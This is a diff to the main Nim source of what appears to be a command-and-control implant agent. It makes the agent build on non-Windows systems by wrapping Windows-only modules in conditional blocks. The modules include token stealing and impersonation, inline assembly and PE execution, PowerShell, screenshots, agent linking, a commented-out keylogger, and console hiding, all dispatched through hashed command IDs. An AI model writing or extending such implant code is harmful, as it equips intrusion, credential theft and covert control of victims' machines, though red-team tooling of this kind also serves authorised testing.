@@ -14,16 +14,18 @@ else:
   import profiles/http as profile
 
 when defined(HIDE_CONSOLE):
-  import winim/lean
+  when defined(windows):
+    import winim/lean
 
 import std/tables
-import winim
-import winim/clr # 7KB
+
+when defined(windows):
+  import winim
+  import winim/clr # 7KB
 
 # Command Imports
 import commands/cat
 import commands/ls
-import commands/lsshares
 import commands/cd
 import commands/cp
 import commands/rm
@@ -33,22 +35,25 @@ import commands/exit
 import commands/ps
 import commands/upload
 import commands/download
-import commands/steal_token
-import commands/rev2self
 import commands/register_file
-import commands/inline_assembly  # +8kb
 import commands/kill
 import commands/sleep
-import commands/powershell
-import commands/powerscript
 import commands/run # +7kb
 import commands/whoami
-import commands/make_token
 import commands/ifconfig   # +4kb
-import commands/screenshot  # +4kb
-import commands/link       # +8kb
-#import commands/keylogger  # +13kb
-import commands/execute_pe
+
+when defined(windows):
+  import commands/lsshares
+  import commands/steal_token
+  import commands/rev2self
+  import commands/inline_assembly  # +8kb
+  import commands/powershell
+  import commands/powerscript
+  import commands/make_token
+  import commands/screenshot  # +4kb
+  import commands/link       # +8kb
+  #import commands/keylogger  # +13kb
+  import commands/execute_pe
 
 # The main Agent Loop
 proc main() =
@@ -59,7 +64,8 @@ proc main() =
   # initialize the profile
   profile.initialize()
 
-  agent.commands = {
+  when defined(windows):
+    agent.commands = {
         210720772860'u64: cast[pointer](cmd_mkdir),  # Command: mkdir
         13889518458486365895'u64: cast[pointer](cmd_powerscript),  # Command: powerscript
         210727925278'u64: cast[pointer](cmd_sleep),  # Command: sleep
@@ -89,11 +95,32 @@ proc main() =
         8246908067895570563'u64: cast[pointer](cmd_screenshot),  # Command: screenshot]
         6385440179'u64: cast[pointer](cmd_link), # Command: link
         }.toTable
+  else:
+    agent.commands = {
+        210720772860'u64: cast[pointer](cmd_mkdir),  # Command: mkdir
+        210727925278'u64: cast[pointer](cmd_sleep),  # Command: sleep
+        6954173687082'u64: cast[pointer](cmd_whoami),  # Command: whoami
+        6385404177'u64: cast[pointer](cmd_kill),  # Command: kill
+        193505114'u64: cast[pointer](cmd_run),  # Command: run
+        7572294763565533'u64: cast[pointer](cmd_download),  # Command: download
+        5863276'u64: cast[pointer](cmd_cd),  # Command: cd
+        6385204799'u64: cast[pointer](cmd_exit),  # Command: exit
+        193488125'u64: cast[pointer](cmd_cat),  # Command: cat
+        5863588'u64: cast[pointer](cmd_ls),  # Command: ls
+        5863780'u64: cast[pointer](cmd_rm),  # Command: rm
+        5863720'u64: cast[pointer](cmd_ps),  # Command: ps
+        5863288'u64: cast[pointer](cmd_cp),  # Command: cp
+        7572495451109098'u64: cast[pointer](cmd_ifconfig),  # Command: ifconfig
+        6954104810698'u64: cast[pointer](cmd_upload),  # Command: upload
+        5863624'u64: cast[pointer](cmd_mv),  # Command: mv
+        2161500648359983177'u64: cast[pointer](cmd_register_file),  # Command: register_file
+        }.toTable
 
 
   # Only hidden if specified in the builder script
   when defined(HIDE_CONSOLE):
-    discard ShowWindow(GetConsoleWindow(), SW_HIDE)
+    when defined(windows):
+      discard ShowWindow(GetConsoleWindow(), SW_HIDE)
 
   when defined(DYNSYSCALLS):
     # set to dynamic
